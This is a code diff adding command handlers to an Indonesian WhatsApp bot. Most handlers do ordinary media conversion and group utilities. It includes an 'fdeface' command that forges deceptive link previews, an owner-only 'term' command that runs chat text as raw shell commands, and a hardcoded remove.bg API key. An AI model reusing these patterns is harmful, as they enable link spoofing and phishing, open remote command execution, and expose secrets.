+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
+						fs.unlinkSync(medok)
+						if (err) return setReply('Error!')
+						buffer453 = fs.readFileSync(ran)
+						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: dev})
+						fs.unlinkSync(ran)
+					})
+					} else {
+					setReply('Reply audionya')
+					}
+				break
+            
+            case 'ghost':
+if(isQuotedAudio) { 
+            setReply(mess.wait)
+					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+					mele = await xdev.downloadAndSaveMediaMessage(encmedia2)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
+					fs.unlinkSync(mele)
+					if (err) return setReply('Error!')
+					buffer453 = fs.readFileSync(ran)
+					xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
+                    fs.unlinkSync(ran)
+				    }) 
+} else {
+				setReply('Reply audionya')
+				}
+		            break
+
+
+
+case 'nightcore':
+if(isQuotedAudio) { 
+setReply(mess.wait)
+					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+					mela = await xdev.downloadAndSaveMediaMessage(encmedia4)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
+						fs.unlinkSync(mela)
+						if (err) return setReply('Error!')
+						buffer453 = fs.readFileSync(ran)
+						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
+						fs.unlinkSync(ran)
+					   })
+					} else {
+						setReply('Reply audionya')
+						}
+				       break
+
+
+
+case 'tupai':
+if(isQuotedAudio) { 
+				setReply(mess.wait)
+					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+					medoi = await xdev.downloadAndSaveMediaMessage(mesi)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
+						fs.unlinkSync(medoi)
+						if (err) return setReply('Error!')
+						buffer453 = fs.readFileSync(ran)
+						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
+						fs.unlinkSync(ran)
+					})
+} else {
+						setReply('Reply audionya')
+						}
+				break
+
+
+
+
+
+case 'imut':
+if(isQuotedAudio) { 
+setReply(mess.wait)
+	 ahu = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
+	masa = await xdev.downloadAndSaveMediaMessage(ahu)
+	ran = getRandom('.mp3')
+	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
+fs.unlinkSync(masa)
+if (err) return setReply('Error!')
+buffer453 = fs.readFileSync(ran)
+xdev.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: dev})
+fs.unlinkSync(ran)
+})
+} else {
+	setReply('Reply audionya')
+	}
+break
+
+       
+       
+      
+        case 'listrespon':{
+          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
+          for (let i = 0; i < commandsDB.length; i++){
+          txt += `❏ Key : ${commandsDB[i].pesan}\n`
+          }
+          setReply(txt)
+          }
+        break
+        
+        
+    case 'reverse':
+            if (!isQuotedVideo) return setReply('Reply videonya!')
+            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+            media = await xdev.downloadAndSaveMediaMessage(encmedia)
+            ran = getRandom('.mp4')
+            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
+            fs.unlinkSync(media)
+            if (err) return setReply(`Err: ${err}`)
+            buffer453 = fs.readFileSync(ran)
+            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
+            fs.unlinkSync(ran)
+            })
+            break
+            
+    
+       case 'sourcecode': 
+       case 'sc': 
+       case 'src':
+              xdev.sendMessage(from, `Bot ini menggunakan sc dari youtube https://youtu.be/dZRGjP-YcLU`, text, {quoted : dev, detecLinks : true})
+              break
+
+case 'style':
+				  if(!q) return setReply('Masukkan teks!')
+         setReply(mess.wait)
+			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
+      let hasil = `*Hasil* :\n${res.data.result}`;
+      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
+    })
+break
+
+case 'pastebin':
+if(!q) return setReply(`Contoh ${prefix}pastebin Extream`)
+yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
+xdev.sendMessage(from, `${yamete.result}`, text, {quoted: setQuoted})
+break
+                     
+     
+
+
+                
+    case 'anime':
+     if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+            setReply(mess.wait)
+            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
+            .then(res => res.text())
+            .then(body => {
+            let tod = body.split("\n");
+            let pjr = tod[Math.floor(Math.random() * tod.length)];
+            imageToBase64(pjr)
+            .then((response) => {
+            media =  Buffer.from(response, 'base64');
+            xdev.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
+            }
+            )
+            .catch((error) => {
+            console.log(error); 
+            }
+            )
+            });
+            break
+            
+    case 'kontak':
+    if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
+            pe = args.join(' ') 
+            entah = pe.split('|')[0]
+            nah = pe.split('|')[1]
+            if (isNaN(entah)) return setReply('Invalid phone number');
+            vcard = 'BEGIN:VCARD\n'
+            + 'VERSION:3.0\n'
+            + `FN:${nah}\n`
+            + `TEL;type=CELL;type=VOICE;waid=${entah}:${PhoneNumber('+' + entah).getNumber('internasional')}\n`
+            + 'END:VCARD'.trim()
+            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
+            break    
+            
+case 'getname':
+if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
+if(isGroup) {
+var ambl = dev.message.extendedTextMessage.contextInfo.participant
+const sname = xdev.contacts[ambl] != undefined ? xdev.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[ambl].notify || xdev.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
+setReply(sname)
+}else {
+const yahu = xdev.contacts[from] != undefined ? xdev.contacts[from].notify = undefined ? PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[from].notify || xdev.contacts[from].vname : PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international')
+setReply(yahu)
+}
+break
+            
+            
+    case 'take':
+    case 'colong':
+    		if (!isQuotedSticker) return setReply(`Reply stickernya denya ${prefix}take Wawan|suka makan`)
+            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
+            ahuh = args.join(' ').split('|')
+            satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
+            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
+            require('./lib/fetcher.js').createExif(satu, dua)
+			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
+			break
+			
+	
+    case 'fdeface':
+            ge = args.join('')           
+            var pe = ge.split("|")[0];
+            var pen = ge.split("|")[1];
+            var pn = ge.split("|")[2];
+            var be = ge.split("|")[3];
+            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
+            if (args.length < 1) return reply (fde)
+             dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
+             tipes = await xdev.downloadAndSaveMediaMessage(dipes)        
+             bufer = fs.readFileSync(tipes)
+             desct = `${pn}`
+             title = `${pen}`
+             url = `${pe}`
+             buu = `https://${be}`
+    		var anus = {
+        	detectLinks: false
+    		}
+    		var mat = await xdev.generateLinkPreview(url)
+    		mat.title = title;
+    		mat.description = desct;
+    		mat.jpegThumbnail = bufer;
+   			mat.canonicalUrl = buu; 
+    		xdev.sendMessage(from, mat, MessageType.extendedText, anus)
+           fs.unlinkSync(tipes)
+            break
+
+		
+			
+				
+			        
+				
+				     
+	
+				case 'delerror':
+				case 'delror':
+					if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
+					try {
+					 listerror.splice(q, 1)
+					fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
+					await xdev.sendMessage(from, `Sukses menghapus ${q} di daftar error`, text)
+					} catch (err){
+						console.log(err)
+						setReply('eror kak')
+					}
+					break
+				
+				
+				
+				
+				
+				
+				
+				
+				case 'delvn':
+					if (!isOwner) return onlyOwner() 
+					try {
+					 wanu = audionye.indexOf(q)
+					 audionye.splice(wanu, 1)
+					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
+				    fs.unlinkSync(`./temp/audio/${q}.mp3`)
+					xdev.sendMessage(from, 'Sukses', text)
+					} catch (err){
+						console.log(err)
+						setReply('eror kak')
+					}
+					break
+					
+					
+					
+				case 'restart':
+if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
+await setReply(`Succes restarting`)
+exec(`node main`)
+break
+	
+			
+				
+				case 'liststik':
+				teks = '*Sticker list :*\n\n'
+				for (let awokwkwk of setiker) {
+					teks += `- ${awokwkwk}\n`
+				}
+				teks += `\n*Total : ${setiker.length}*`
+				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
+				break
+				
+				
+				
+				case 'listvn':
+			case 'vnlist':
+				teks = '*List Vn:*\n\n'
+				for (let awokwkwk of audionye) {
+					teks += `- ${awokwkwk}\n`
+				}
+				teks += `\n*Total ada : ${audionye.length}*`
+				teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
+				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb }}}, contextInfo: forward })
+				break
+				
+				
+				
+				
+				
+				
+				
+		    
+
+
+
+	
+
+
+
+	
+	    
+    
+    
+
+case 'exif':
+case 'setexif':
+if (!isOwner && !dev.key.fromMe) return onlyOwner()
+const exifff = `${args.join(' ')}`
+const namaPack = exifff.split('|')[0]
+const authorPack = exifff.split('|')[1]
+exif.create(namaPack, authorPack)
+await setReply('Done gan')
+break
+
+
+case 'sticker':
+					case 'stiker':
+					case 's':
+						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
+							await ffmpeg(`${media}`)
+									.input(media)
+									.on('start', function (cmd) {
+										console.log(`Started : ${cmd}`)
+									})
+									.on('error', function (err) {
+										console.log(`Error : ${err}`)
+										fs.unlinkSync(media)
+										setReply(`${err}`)
+									})
+									.on('end', function () {
+										console.log('Finish')
+										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
+											if (error) return setReply(mess.error.api)
+											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
+											fs.unlinkSync(media)	
+											fs.unlinkSync(`./sticker/${sender}.webp`)	
+										})
+									})
+									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
+									.toFormat('webp')
+									.save(`./sticker/${sender}.webp`)
+						} else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
+							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
+							setReply(mess.wait)
+								await ffmpeg(`${media}`)
+									.inputFormat(media.split('.')[4])
+									.on('start', function (cmd) {
+										console.log(`Started : ${cmd}`)
+									})
+									.on('error', function (err) {
+										console.log(`Error : ${err}`)
+										fs.unlinkSync(media)
+										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
+										setReply(mess.error.api)
+									})
+									.on('end', function () {
+										console.log('Finish')
+										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
+											if (error) return setReply(error)
+											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
+											fs.unlinkSync(media)
+											fs.unlinkSync(`./sticker/${sender}.webp`)
+										})
+									})
+									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
+									.toFormat('webp')
+									.save(`./sticker/${sender}.webp`)
+						}  else {
+							setReply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
+						}
+						break
+
+
+case 'nobg':
+if ((isMedia || isQuotedImage)) {
+const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+const media = await xdev.downloadAndSaveMediaMessage(encmedia)
+ranw = getRandom('.webp')
+ranp = getRandom('.png')
+setReply(mess.wait)
+keyrmbg = '9Gs2qT31Ensb4gEmxw5p28JA'
+await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
+fs.unlinkSync(media)
+let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
+fs.writeFileSync(ranp, bufferir9vn5, (err) => {
+if (err) return setReply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
+})
+exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
+fs.unlinkSync(ranp)
+if (err) return setReply(`emror bang ${err}`)
+xdev.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: dev })
+fs.unlinkSync(ranw)
+})
+}) 
+}
+break
+
+
+
+            case 'addcmd': 
+			case 'setcmd':{
+                  if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+                  if (isQuotedSticker) {
+                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
+                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
+                   if (checkSCommand(kodenya, _scommand) === true) return setReply(`Command tersebut sudah ada`)
+                  addCmd(kodenya, q)
+                  setReply("_Success_")
+                  } else {
+                  setReply('tag stickenya')
+                  }
+                  }
+            break
+            
+            
+			
+            case 'toptt':
+             if (isQuotedAudio){
+					setReply(mess.wait)
+					encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+					media = await xdev.downloadAndSaveMediaMessage(encmedia)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+						fs.unlinkSync(media)
+						if (err) return setReply('Gagal mengkonversi audio ke ptt')
+						topt = fs.readFileSync(ran)
+						 xdev.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: dev, ptt:true})
+						fs.unlinkSync(ran)
+						})
+						}
+					break
+            
+   
+            
+            case 'delcmd':{
+                  if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+                  if (!isQuotedSticker) return setReply(`Penggunaan : ${command} tagsticker`)
+                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
+                  if (checkSCommand(kodenya, _scommand) === false) return setReply(`Command tersebut tidak ada`)
+                  _scommand.splice(getCommandPosition(kodenya), 1)
+                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
+                  setReply("_Success_")
+                  }
+            break
+            case 'listcmd':
+let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
+let cemde = [];
+for (let i of _scommand) {
+cemde.push(i.id)
+teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
+}
+mentions(teksnyee, cemde, true)
+break
+    case 'toimg':
+			if (!isQuotedSticker) return setReply('Reply stickernya')
+			setReply(mess.wait)
+			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+			media = await xdev.downloadAndSaveMediaMessage(encmedia)
+			ran = getRandom('.png')
+			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+			fs.unlinkSync(media)
+			if (err) return setReply('Yah gagal, coba ulangi ^_^')
+			buffer = fs.readFileSync(ran)
+			xdev.sendMessage(from, buffer, image)
+			fs.unlinkSync(ran)
+			})
+			break
+	
+	
+			
+			
+	
+	
+	case 'semoji':
+			if (!q) return setReply('emojinya?')
+			qes = args.join(' ')
+			emoji.get(`${qes}`).then(emoji => {
+			teks = `${emoji.images[4].url}`
+    		sendStickerUrl(from,`${teks}`)	
+    		console.log(teks)
+   			})
+    		break
+    
+    
+	
+            
+
+
+
+
+case 'listonline':
+             if (!isGroup) return setReply(`*Only group*`)
+             try {
+             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
+             let online = [...Object.keys(xdev.chats.get(ido).presences), xdev.user.jid]
+             xdev.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: dev, contextInfo: { mentionedJid: online }})
+             } catch (e) {
+             setReply(`${e}`)
+}
+break
+
+
+case 'listgc':
+const txs = xdev.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${xdev.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
+setReply(txs)
+break
+            
+case 'listpc': {
+let anu = await xdev.chats.all().filter(v => v.jid.endsWith('.net')).map(v => v.jid)
+let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
+jumlah = []
+for (let i of anu) {
+teks += `⬡ *Nama :* ${xdev.getName(i)}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
+jumlah.push(i)
+}
+setReply(teks)
+}
+break
+            
+           
+           
+           
+            
+
+ 	
+
+     
+case 'brainly':{
+if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+if (!q) setReply( 'Soalnya?')
+nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
+foto = await getBuffer(nana)   
+try{
+  var res = await brainly.search('id', q)
+} catch (err) {
+var res = await brainly.searchWithMT('id', `${q}`)
+}
+teks =`_*BRAINLY*_\n\n`
+
+
+   teks += res.map(({ question, answers }, i) => `
+_*PERTANYAAN KE ${i + 1}*_
+${question.content}${answers.map((v, i) => `
+
+*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
+${v.content}`).join``}`).join(`
+═════════════════
+`)
+ 
+ teks +=`\n\n_Thanks for choosing Brainly_`
+ 
+let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
+sendButLocation(from, teks, `© ${fake1}`, foto, mok, {contextInfo: forward})             
+limitAdd(senderNumber, user)
+}
+break
+			
+			
+			
+
+
+  
+
+           
+        
+        
+           
+
+
+  
+	case 'term':
+    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+			if (!q) return setReply(mess.wrongFormat)
+			exec(q, (err, stdout) => {
+			if (err) return setReply(`SELF-BOT:~ ${err}`)
+			if (stdout) {
+			setReply(stdout)
+			}
+			})
+		    break 
+		
+		
+    case 'join':    
+    try{
+                          if (!isOwner)return setReply(`Perintah ini Khusus owner`) 
+                          if (args.length < 1) return setReply(`Kirim perintah *${prefix}join* link grup`)
+                          if(!isGroup){
+                          if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return setReply(mess.error.Iv)
+                          let code = args[0].replace('https://chat.whatsapp.com/', '')
+                          xdev.acceptInvite(code)
+                         
+                          setReply(`_Succses Join Group!_`)
+                          } else {
+                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
+                            link = args[0].replace('https://chat.whatsapp.com/','')
+                            fak = xdev.query({ json: ['action', 'invite', link],
+                            expect200: true })
+                           
+                            setReply('*Successfully Entered Group*')
+                            }
+                           }catch (err){
+						console.log(err)
+						return setReply("Link Error")
+					}
+                           break
+                 
+                 
+                case 'ovo':
+                  xdev.sendMessage(from, fs.readFileSync('./kode qr/ovo.jpg'), image, {quoted: setQuoted})
+                    break 
+                case 'gopay':
+                  xdev.sendMessage(from, fs.readFileSync('./kode qr/gopay.jpg'), image, {quoted: setQuoted})
+                    break 
+                     case 'dana':
+                  xdev.sendMessage(from, fs.readFileSync('./kode qr/dana.jpg'), image, {quoted: setQuoted})
+                    break 
+                 
+    
+
+            
+case 'runtime':
+case 'test':   
+run = process.uptime() 
+teks = runtime(run)            
+teksnya =`Bot aktif selama ${teks}`
+setReply(teksnya)
+break  
+      
+      
+	case 'speed':
+	case 'ping':
+			const timestamp = speed();
+			exec(`neofetch --stdout`, (error, stdout, stderr) => {
+			const child = stdout.toString('utf-8')
+			const teks = child.replace(/Memory:/, "Ram:")
+			const pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
+			xdev.sendMessage(from, pingnya, text, {quoted: setQuoted})
+			})
+			break  
+			
+			
+    case 'totag':
+    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
+            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, sticker, options)
+            fs.unlinkSync(file)
+            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
+            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, image, options)
+            fs.unlinkSync(file)
+        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
+            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+                mimetype : 'audio/mp4',
+                ptt : true,
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, audio, options)
+            fs.unlinkSync(file)
+        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
+            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+                mimetype : 'video/mp4',
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, video, options)
+            fs.unlinkSync(file)
+        } else{
+          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
+        }
+        break
+    
+    
+    
+    
+    case 'inspect':
+    if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+            try{
+            setReply(mess.wait)
+            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
+            if (!q) return setReply('masukan link wa')
+            cos = args[0]
+            var net = cos.split('https://chat.whatsapp.com/')[1]
+            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
+            jids = []
+            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
+            json: ["query", "invite",net],
+            expect200:true })
+            let par = `*Id* : ${id}
+${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
+*Nama Gc* : ${subject}
+*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
+*Jumlah Member* : ${size}
+${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
+*Id desc* : ${descId}
+${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
+           for ( let y of participants) {
+             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
+             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
+             }
+             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
+             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
+             xdev.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
+             limitAdd(senderNumber, user)
+             } catch (err){
+						console.log(err)
+						setReply(`${err}`)
+					}
+			
+             break
+             
+case 'd':
+case 'del':
+case 'delete':
+if (mentionByReply == botNumber) {
+xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
+} else  {
+setReply("Reply pesan bot nya *Tomlol!* 😡")
+}
+break
+            
+					
+case 'sider':
+if (mentionByReply == botNumber) {
+infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
+tagg = []
+shape = '▢'
+teks = `Telah Dibaca Oleh :\n\n`
+for(let i of infom.reads){
+teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
+teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
+tagg.push(i.jid)
+}
+mentions(teks, tagg, true)
+} else {
+setReply("Reply pesan bot nya *Tomlol!* 😡")
+}
+break
+
+case 'banchat':
+if (!isOwner) return onlyOwner()
+if (!isGroup) return setReply(mess.only.group)
+if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+if (isBanchat) return setReply(`udah di ban`)
+addDataId(from, command, DataId)
+setReply(`Bot berhasil Ban di group ini`)
+break
+
+
+					
+
+case 'unbanchat':
+if (!isOwner) return onlyOwner() 
+try {
+if (!isBanchat) return setReply(`udah di UnBan`)
+removeDataId ("banchat", from, DataId)
+setReply(`Bot telah di Unban di group ini`)
+} catch (err){
+console.log(err)
+setReply(`${err}`)
+}
+break
+
+
+
+
+case 'infoall': case 'tagall':
+ if(isExtream) return
+if(!q) return setReply('Ingfonya apa?')
+if (!isGroup) return setReply(mess.only.group)
+var nom = dev.participant
+members_id = []
+teks = '\n'
+for (let mem of groupMembers) {
+teks += `┣ ⬣@${mem.jid.split('@')[0]}\n`
+members_id.push(mem.jid)
+}
+mentions(`
